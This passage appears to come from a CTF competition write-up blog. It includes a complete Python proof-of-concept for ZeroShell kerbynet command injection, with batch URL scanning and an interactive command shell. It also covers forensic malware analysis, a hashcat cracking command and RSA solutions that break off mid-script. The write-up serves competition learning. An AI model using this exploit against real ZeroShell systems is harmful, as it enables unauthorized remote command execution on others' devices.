environment.\033[0m\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parseArgs</span>(<span class="params">self</span>):</span><br><span class="line">        date = time.strftime(<span class="string">&quot;%Y-%m-%d_%H-%M-%S&quot;</span>, time.localtime())</span><br><span class="line">        parser = ArgumentParser(description=<span class="string">&quot;\033[31mNotice：You Must To Use One Of -u/-f\033[0m&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">f&quot;The target url&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;URLFILE&quot;</span>, <span class="built_in">help</span>=<span class="string">f&quot;The target url file&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--thread&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">32</span>, <span class="built_in">help</span>=<span class="string">f&quot;Number of thread, default is 32&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-T&quot;</span>, <span class="string">&quot;--timeout&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">3</span>, <span class="built_in">help</span>=<span class="string">&quot;request timeout(default 3)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&quot;FILENAME&quot;</span>, default=date, <span class="built_in">help</span>=<span class="string">&quot;Vuln url output file, default is &#123;date&#125;.txt&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;--attack&quot;</span>, required=<span class="literal">False</span>, action=<span class="string">&quot;store_true&quot;</span>, default=<span class="literal">False</span>, <span class="built_in">help</span>=<span class="string">&quot;Use this parameter to attack a URL&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> parser</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理url格式</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parseURL</span>(<span class="params">self, url</span>):</span><br><span class="line">        newURL = url</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;http://&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> newURL <span class="keyword">and</span> <span class="string">&quot;https://&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> newURL:</span><br><span class="line">            newURL = <span class="string">f&quot;http://<span class="subst">&#123;newURL&#125;</span>&quot;</span></span><br><span class="line">        newURL = newURL.replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> newURL</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载url地址(带http://)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loadURL</span>(<span class="params">self</span>):</span><br><span class="line">        urlList = []</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.args.file, encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                line = <span class="variable language_">self</span>.parseURL(line.strip())</span><br><span class="line">                urlList.append(line)</span><br><span class="line">        <span class="keyword">return</span> urlList</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 验证漏洞</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, url</span>):</span><br><span class="line">        cmd = <span class="string">&quot;echo &#x27;1qazxsw23edc&#x27;&quot;</span></span><br><span class="line">        repData = <span class="variable language_">self</span>.exploitVuln(url, cmd)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;1qazxsw23edc&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">            msg = <span class="string">f&quot;\033[32m[+]  [Vuln]  <span class="subst">&#123;url&#125;</span>\033[0m&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.args.url:</span><br><span class="line">                <span class="variable language_">self</span>.hasVuln = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.args.file:</span><br><span class="line">                <span class="variable language_">self</span>.lock.acquire()</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.findCount += <span class="number">1</span></span><br><span class="line">                    <span class="variable language_">self</span>.vulnRULList.append(url)</span><br><span class="line">                <span class="keyword">finally</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.lock.release()</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Conn&quot;</span> == repData:</span><br><span class="line">            msg = <span class="string">f&quot;\033[31m[!]  [Conn]  <span class="subst">&#123;url&#125;</span>\033[0m&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">f&quot;[-]  [Safe]  <span class="subst">&#123;url&#125;</span>&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.lock.acquire()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(msg)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="variable language_">self</span>.lock.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 利用漏洞</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploitVuln</span>(<span class="params">self, url, cmd</span>):</span><br><span class="line">        reqURL = url + <span class="string">&quot;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A$cmd$%0A%27&quot;</span>.replace(<span class="string">&quot;$cmd$&quot;</span>, cmd)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rep = requests.get(url=reqURL, headers=headers, timeout=<span class="variable language_">self</span>.args.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="comment"># fileData = rep.text</span></span><br><span class="line">            <span class="keyword">return</span> rep.text</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Conn&quot;</span></span><br><span class="line">        <span class="comment"># try:</span></span><br><span class="line">        <span class="comment">#     print(fileData)</span></span><br><span class="line">        <span class="comment">#     result = fileData[:fileData.find(&quot;&lt;html&gt;&quot;)]</span></span><br><span class="line">        <span class="comment">#     return result</span></span><br><span class="line">        <span class="comment"># except:</span></span><br><span class="line">        <span class="comment">#     return &quot;Safe&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 批量验证</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">multiVerify</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.findCount = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.vulnRULList = []</span><br><span class="line">        executor = ThreadPoolExecutor(max_workers=<span class="variable language_">self</span>.args.thread)</span><br><span class="line">        <span class="built_in">all</span> = [executor.submit(<span class="variable language_">self</span>.verify, (url)) <span class="keyword">for</span> url <span class="keyword">in</span> <span class="variable language_">self</span>.urlList]</span><br><span class="line">        wait(<span class="built_in">all</span>)</span><br><span class="line">        <span class="variable language_">self</span>.outputResult()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单个攻击利用</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 攻击</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cmd = <span class="built_in">input</span>(<span class="string">&quot;\033[42m&quot;</span> + <span class="string">&quot;Input CMD&gt;&quot;</span> + <span class="string">&quot;\033[0m&quot;</span> + <span class="string">&quot; &quot;</span>)</span><br><span class="line">                repData = <span class="variable language_">self</span>.exploitVuln(<span class="variable language_">self</span>.args.url, cmd)</span><br><span class="line">                attackResult = <span class="built_in">list</span>(repData.strip().split(<span class="string">&quot;&lt;html&gt;&quot;</span>))[<span class="number">0</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>, attackResult.strip(), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n\nBye~\n&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\nError.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 依据参数选择模式</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.args.file <span class="keyword">and</span> <span class="keyword">not</span> <span class="variable language_">self</span>.args.url:</span><br><span class="line">            <span class="variable language_">self</span>.argsClass.print_help()</span><br><span class="line">        <span class="comment"># 单个验证</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="variable language_">self</span>.args.url:</span><br><span class="line">            url = <span class="variable language_">self</span>.parseURL(<span class="variable language_">self</span>.args.url)</span><br><span class="line">            <span class="variable language_">self</span>.verify(url)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.args.attack:</span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.hasVuln:</span><br><span class="line">                    <span class="variable language_">self</span>.attack()</span><br><span class="line">        <span class="comment"># 批量验证</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.init()</span><br><span class="line">            <span class="variable language_">self</span>.urlList = <span class="variable language_">self</span>.loadURL()  <span class="comment"># 所有目标</span></span><br><span class="line">            <span class="variable language_">self</span>.multiVerify()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">outputResult</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nattemptCount：\033[31m%d\033[0m   findCount：\033[32m%d\033[0m&quot;</span> % (<span class="built_in">len</span>(<span class="variable language_">self</span>.urlList), <span class="variable language_">self</span>.findCount))</span><br><span class="line">        <span class="variable language_">self</span>.end = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Time Spent: %.2f&quot;</span> % (<span class="variable language_">self</span>.end - <span class="variable language_">self</span>.start))</span><br><span class="line">        <span class="comment"># 写文件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.findCount &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(<span class="string">r&quot;./output&quot;</span>):</span><br><span class="line">                os.mkdir(<span class="string">r&quot;./output&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.outputFile = <span class="string">f&quot;./output/<span class="subst">&#123;self.vulnName&#125;</span>_<span class="subst">&#123;self.args.output&#125;</span>.txt&quot;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.outputFile, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> url <span class="keyword">in</span> <span class="variable language_">self</span>.vulnRULList:</span><br><span class="line">                    f.write(url + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">20</span>, <span class="string">f&quot;\nThe vulnURL has been saved in \033[36m<span class="subst">&#123;self.outputFile&#125;</span>\033[0m\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ZeroShell_RCE_POC()</span><br></pre></td></tr></table></figure>
<p>输入命令<code> python .\ZeroShell_RCE.py -u http://61.139.2.100/ --attack</code></p>
<p>然后输入命令<code>find / -type f -name &quot;*flag*&quot;</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/aKdD8CxPsHirtEI.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/zXid9U6vIjCukwM.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/XtPGbkaHpyAJjxl.png"
                        alt=""
                 ></p>
<p>包上flag头直接提交即可</p>
<h4 id="zeroshell-3"><strong>zeroshell_3</strong></h4>
<p>将vmdk直接使用diskgenius挂载，在第二题flag的同目录下找到一个.nginx文件，复制出来</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/4WYZCwgkXsRG7eK.png"
                        alt=""
                 ></p>
<p>上传微步云沙箱确定是木马病毒，在静态分析的ASCII中看到一个IP地址，直接提交即可</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/m4MOIXad6etl29r.png"
                        alt=""
                 ></p>
<p>本题也可以直接使用netstat命令</p>
<h4 id="zeroshell-4">zeroshell_4</h4>
<p>第三题的文件名.nginx直接交就行</p>
<h4 id="zeroshell-5">zeroshell_5</h4>
<p>打开前一题的.nginx文件，使用ida32查看字符串发现一串可疑字符，尝试提交flag正确</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="C:/Users/67300/Downloads/a1natas/remote_png/564daf9f-d343-48fa-96db-23b8203e3d77.png"
                        alt=""
                 ></p>
<h4 id="WinFT-1">WinFT_1</h4>
<p>可以在常见的系统位置找到可疑的exe</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/lYzV3QqJZWUB89h.png"
                        alt=""
                 ></p>
<p>使用微步云沙箱判定为木马，在网络行为中得到域名</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/ejW5YNKi3AZHFL4.png"
                        alt=""
                 ></p>
<p>双击运行后打开桌面上的火绒剑</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/qpXnsiMaRm9AI2F.png"
                        alt=""
                 ></p>
<p>得到ip地址和端口</p>
<h4 id="WinFT-2">WinFT_2</h4>
<p>使用虚拟机内的PCHunter，选择启动，第三个选项，往下拉最后一个找到flag，然后右键导出，另存为1.txt，可以发现flag密文</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/P9x2CjSKn3drqcl.png"
                        alt=""
                 ></p>
<p>cyberchef解密得到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/WpjefKs1nHyEucb.png"
                        alt=""
                 ></p>
<h4 id="WinFT-5">WinFT_5</h4>
<p><img  
                       lazyload
                       alt="image"
                       data-src="C:/Users/67300/Downloads/ctf/attachments/14d53964-2181-49ff-a973-fde73f870989.png"
                        alt=""
                 ></p>
<p>CTF-NetA直接梭出压缩包，也可以导出http对象，压缩包被分为两个部分，一部分在client中，一部分在server中，修复后可不报错，但忽略报错也可进行下一步，打开发现有一个压缩包中存在flag.txt，并存在注释时间线关联非常重要</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="C:/Users/67300/Downloads/ctf/attachments/8461b8c0-327b-4bc8-9028-ac4f3fea0e36.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/EeghwPDfZNK2GdQ.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/SpzWsgaR81ZVwGI.png"
                        alt=""
                 >直接得到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/OGPuY4mpAonkNqD.png"
                        alt=""
                 ></p>
<h4 id="sc05-1">sc05_1</h4>
<p>在excel的三张sheet中找到时间最早的，注意空格修改为下划线，转换成md5即可</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="C:/Users/67300/Downloads/a1natas/remote_png/96e8e90f-b75b-4a0a-87b0-d8a9209fa2f3.png"
                        alt=""
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/l2J57XoU9sAEnpR.png"
                        alt=""
                 ></p>
<h4 id="Kiwi">Kiwi</h4>
<p><img  
                       lazyload
                       alt="image"
                       data-src="C:/Users/67300/Downloads/ctf/attachments/0a3d3cc2-f5ff-4cd7-9afb-9036c31f3c67.png"
                        alt="base表" title=" =558x319.5"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="C:/Users/67300/Downloads/ctf/attachments/2f72d801-2407-4704-b667-a3f176cfef7d.png"
                        alt="" title=" =1112.5x426"
                 ></p>
<p>伪随机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stddef.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char mm[] = &#123; 0xb9,0x48,0x1c,0x58,0x81,0x4f,0x51,0x7d,0x27,0x70,0x33,0x6f,0x79,0x48,0x82,0x21,0x08,0x80,0x79,0x49,0x51,0x52,0x28,0x9b,0x7d,0xbb,0x40,0x67,0x45,0x7a,0x96,0x38,0x3e,0x7d,0x41,0x42,0x86,0x60,0x4f,0x6c,0x3b,0x87,0x2e,0x26,0x72,0x51,0x83,0x80,0x79,0xbd,0x79,0x40,0x67,0x71,0x4a,0xa2,0x98,0x76,0x3a,0x8f,0x68,0xda,0x7f,0x74,0x2a,0x33,0x55,0x8d,0x5e,0x2b,0x39,0x6d,0xbe,0x5f,0x74,0x74,0x7d,0x11,0x8e,0x4b,0x4d,0x99,0x64,0x79,0x63,0xb3,0x73,0xca,0x31,0x90,0xc3,0x77,0x1b,0x6f,0x61,0x52,0x11,0xbc,0xbd,0x86,0xb2,0x78,0x4f,0x7e,0x56,0x8f,0x6c,0x94,0xb4,0x3a,0x7f,0x14,0x4b,0x79,0xb6,0x8c,0xb0,0xad,0x8b,0x67,0x6d,0xd1,0x7a,0x9a,0xa7,0x31,0x74,0x25,0x3e,0x61,0x2e,0x82,0x3d,0x63,0x5e,0x77,0x6b,0x7c,0x3f,0x24,0x65,0x35,0x9f,0x53,0x84,0x92,0x42,0xa0,0x7d,0x66,0x70,0x3b,0xd3,0x65,0xa2,0x6d,0x7f,0x19,0x92,0x7a,0x8c,0xb8,0x6b,0x12,0x18,0x66,0x74,0xc0,0x48,0x64,0x9d,0x0e,0x6f,0x53,0x96,0x49,0x61,0x5d &#125;;</span><br><span class="line">unsigned char aIxxeeddsseeeed[11] = &#123;</span><br><span class="line">    0x0069, 0x0078, 0x0065, 0x0064, 0x0053, 0x0065, 0x0065, 0x0064,</span><br><span class="line">    0x0000, 0x0000, 0x0000</span><br><span class="line">&#125;;</span><br><span class="line"> //wchar_t* v12 = (wchar_t*)mm;</span><br><span class="line"></span><br><span class="line">int  main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    wchar_t  v5 = 70;</span><br><span class="line">   int v6 = 0;</span><br><span class="line">    int64_t v7 = 0;</span><br><span class="line">    int v8 = 1;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">        v6 = (v6 + v8 * v5) % 256;</span><br><span class="line">        v5 = aIxxeeddsseeeed[v7++];</span><br><span class="line">        ++v8;</span><br><span class="line">    &#125; while (v5);</span><br><span class="line">    srand(v6);</span><br><span class="line">    // v13=0;</span><br><span class="line"></span><br><span class="line">    //   do</span><br><span class="line">    //   &#123;</span><br><span class="line">    //     *v12 = v6 ^ (*(unsigned short *)((char *)v12)- (rand() % 128) );</span><br><span class="line">    //       printf(&quot;%c&quot;, (unsigned char)*v12);</span><br><span class="line">    //     ++v12;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //   &#125;</span><br><span class="line">    //   while ( v13&lt;176 );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for (int i=0;i&lt;188;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm[i] -= (rand() % 128);</span><br><span class="line">        printf(&quot;%c&quot;, v6^mm[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用hashcat跑rockyou进行爆破，包上flag头提交</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.\hashcat.exe -m <span class="number">1000</span> 23d1e086b85cc18587bbc8c33adefe07 .\rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="C:/Users/67300/Downloads/ctf/attachments/8993b5a2-feb4-4939-ba89-e42ffee34fe0.png"
                        alt=""
                 ></p>
<h3 id="Crypto">Crypto</h3>
<h4 id="rasnd">rasnd</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">➜  <span class="number">67300</span>  nc <span class="number">8.147</span><span class="number">.133</span><span class="number">.224</span> <span class="number">24638</span></span><br><span class="line">==================================================================</span><br><span class="line"><span class="number">26431208729444714023658171519567999611655156163666012461049377852754522364967983334888008719169005067132147457768145650432224601627572396711625740992434441502981404085906974043449692385194523725663285381805341752664655843649525267244306284262782760081144936989568445791452171942309762572110024693191466625296798707442953800544083663459059607487968090942333009755531218995107857576848493115570943076327104093937764106177027114753702492658138243770682404261523142313860233316535573423753816665712808112231455199413993508133831121471131906694009124041404243156970894355864766787488671710960092926014349891982419011949171</span></span><br><span class="line"><span class="number">24515238681833205058342606937833381623401245973168414853552637114967604304443295650716165826636269802104285585640785686262729645662905133105311101575743339728027740930198498392537921389394080685434963506716037135352849525789611087440143854066880720394035373451872403694792246563655156782022724836500224286369632521434968249788657352092826521450427795603602500323214480586810427570710369585376924983594043248745989472914214103122255392581242195061296966498148760190374756531179592246985996456594796901388558130935937584350155732932245278425238100668963908762448069803640676369050750711244794874869155287504403144983084</span></span><br><span class="line"><span class="number">2064120122486440703610541536570451884663780216683065730451818597055621226031049075464398251942835554536690853529198524753557660960594411178812768720190155976723066113826153103576041405021206449486249562762593250513782438363830385600090683687760866931577267493622854286079464141370933615968731326955680488344822733325742351465125946700985576519</span></span><br><span class="line"><span class="number">2935698460648172088063031410750512508234908976540687720254424133725835569164297032235762632619856285739290168966048772112064235471499992380139042298936926206905432523718824033938889756149990133197711316969898581370101026667914673283950069188676249801734232382073910838997288966102918790204590242077807341645627422986361111366813082512392024620482091820573855446248318944454642989583450100570999255020573141528738185667463913084742564103197376665933282101287161274</span></span><br><span class="line">==================================================================</span><br><span class="line"><span class="number">22609502097790234125054452787465543003647975511286840768095519946651235118302804436788755412589909626630822145015825153818779779406749336821713379108753050305179390093992333638236889201725893091374485649096766519789288950500200124189067656148700692399356901167146079967302004119252705512230526542099543413171942892112669026043001010017788228299811485314813319990227836194271303053376683758456535811698702038204149156337167048777194593272366445920406472017012914585645482400546617935822140434931173826866414324753906604262460223764100204237134789955255188106972496113478446427586130414140010823891272297003194926230023</span></span><br><span class="line"><span class="number">11599167986640895898781971259081838478524805543534436356054053614288967740440439361412680894217412846279034763231201956049305130725083515069792707920325789590198230645640731674949349040881104339923854646475865931356220992256393916882975836109215524206787560218489872579272148059406709057819992106787893281165549258146984026281104140400064989463689031911589624412291434825131580945272270843483732459446239491502847830350348745117392825584823793179119646757780211829113540370632558380288667034742149996713717201156473783389810018832390320177801407677970433685648156375816420344601563935714086163474936282133816876218251</span></span><br><span class="line"><span class="number">1801425683678256606736404706447142164110264221348335073457890665037517041006658717190218795103561882775943412524505051746427315467091725945198550139035086086528039220163979654809744394104028007130486086748767327965439536725142791444317255854784220030075101640255172837483479293192967227954809841132893568187834401490795446371023027485194836171461214656614519811563111503945847345035068021888333767209423865470845356512967566901488058778855984568194053176100466569889237262126196055681993939938349250044641142168939615976989387885567607621744997101058855951708381880183650217398458332988742908791818405712081953286265</span></span><br><span class="line">==================================================================</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols,solve</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">n = <span class="number">26431208729444714023658171519567999611655156163666012461049377852754522364967983334888008719169005067132147457768145650432224601627572396711625740992434441502981404085906974043449692385194523725663285381805341752664655843649525267244306284262782760081144936989568445791452171942309762572110024693191466625296798707442953800544083663459059607487968090942333009755531218995107857576848493115570943076327104093937764106177027114753702492658138243770682404261523142313860233316535573423753816665712808112231455199413993508133831121471131906694009124041404243156970894355864766787488671710960092926014349891982419011949171</span></span><br><span class="line">c = <span class="number">24515238681833205058342606937833381623401245973168414853552637114967604304443295650716165826636269802104285585640785686262729645662905133105311101575743339728027740930198498392537921389394080685434963506716037135352849525789611087440143854066880720394035373451872403694792246563655156782022724836500224286369632521434968249788657352092826521450427795603602500323214480586810427570710369585376924983594043248745989472914214103122255392581242195061296966498148760190374756531179592246985996456594796901388558130935937584350155732932245278425238100668963908762448069803640676369050750711244794874869155287504403144983084</span></span><br><span class="line">h1 = <span class="number">2064120122486440703610541536570451884663780216683065730451818597055621226031049075464398251942835554536690853529198524753557660960594411178812768720190155976723066113826153103576041405021206449486249562762593250513782438363830385600090683687760866931577267493622854286079464141370933615968731326955680488344822733325742351465125946700985576519</span></span><br><span class="line">h2 = <span class="number">2935698460648172088063031410750512508234908976540687720254424133725835569164297032235762632619856285739290168966048772112064235471499992380139042298936926206905432523718824033938889756149990133197711316969898581370101026667914673283950069188676249801734232382073910838997288966102918790204590242077807341645627422986361111366813082512392024620482091820573855446248318944454642989583450100570999255020573141528738185667463913084742564103197376665933282101287161274</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">12</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    q = gcd(a * (h1+<span class="number">0x114</span>) - b * (h2+<span class="number">0x514</span>), n)</span><br><span class="line">    <span class="keyword">if</span> q != <span class="number">1</span> <span class="keyword">and</span> q &lt; n:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p = n // q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">flag1 = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line">n = <span class="number">22609502097790234125054452787465543003647975511286840768095519946651235118302804436788755412589909626630822145015825153818779779406749336821713379108753050305179390093992333638236889201725893091374485649096766519789288950500200124189067656148700692399356901167146079967302004119252705512230526542099543413171942892112669026043001010017788228299811485314813319990227836194271303053376683758456535811698702038204149156337167048777194593272366445920406472017012914585645482400546617935822140434931173826866414324753906604262460223764100204237134789955255188106972496113478446427586130414140010823891272297003194926230023</span></span><br><span class="line">c = <span class="number">11599167986640895898781971259081838478524805543534436356054053614288967740440439361412680894217412846279034763231201956049305130725083515069792707920325789590198230645640731674949349040881104339923854646475865931356220992256393916882975836109215524206787560218489872579272148059406709057819992106787893281165549258146984026281104140400064989463689031911589624412291434825131580945272270843483732459446239491502847830350348745117392825584823793179119646757780211829113540370632558380288667034742149996713717201156473783389810018832390320177801407677970433685648156375816420344601563935714086163474936282133816876218251</span></span><br><span class="line">hint = <span class="number">1801425683678256606736404706447142164110264221348335073457890665037517041006658717190218795103561882775943412524505051746427315467091725945198550139035086086528039220163979654809744394104028007130486086748767327965439536725142791444317255854784220030075101640255172837483479293192967227954809841132893568187834401490795446371023027485194836171461214656614519811563111503945847345035068021888333767209423865470845356512967566901488058778855984568194053176100466569889237262126196055681993939938349250044641142168939615976989387885567607621744997101058855951708381880183650217398458332988742908791818405712081953286265</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">val = invert(hint,n)</span><br><span class="line"></span><br><span class="line">p = symbols(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">ans = solve([<span class="number">514</span>*p**<span class="number">2</span>-<span class="number">114</span>*n-val*p],p)</span><br><span class="line"></span><br><span class="line">p = <span class="number">150247279952912796628319439167087598658960209857939715481384766412377887286917020812600778554628283790584194733223642988071731185823236097710318351169230270503948468805605661101833776560552877189520975508661723196203726478092488148840301081427770623476948137746893798233610291628878063995483607207704552192627</span></span><br><span class="line"></span><br><span class="line">d = invert(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br><span class="line"></span><br><span class="line">flag2 = 